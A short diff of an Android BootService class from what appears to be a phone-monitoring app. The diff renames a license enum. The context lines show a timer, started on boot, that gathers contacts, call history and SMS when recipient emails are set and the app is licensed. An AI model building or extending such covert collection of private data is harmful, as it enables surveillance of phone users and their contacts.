@@ -8,7 +8,7 @@ import system.service.config.ConfigCtrl;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.license.LicenseCtrl;
-import com.particle.inspector.common.util.license.LicenseType;
+import com.particle.inspector.common.util.license.LICENSE_TYPE;
 
 import android.app.Service;
 import android.content.Intent;
@@ -74,10 +74,10 @@ public class BootService extends Service
 		Log.v(LOGTAG, "started");
 		
 		// Start timer to get contacts, phone call history and SMS
-		LicenseType type = ConfigCtrl.getLicenseType(getApplicationContext());
+		LICENSE_TYPE type = ConfigCtrl.getLicenseType(getApplicationContext());
 		String[] mails = GlobalPrefActivity.getMail(this).split(",");
 		mails = StrUtils.filterMails(mails);
-		if (mails.length > 0 && type != LicenseType.NotLicensed) 
+		if (mails.length > 0 && type != LICENSE_TYPE.NOT_LICENSED) 
 		{
 			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
 		
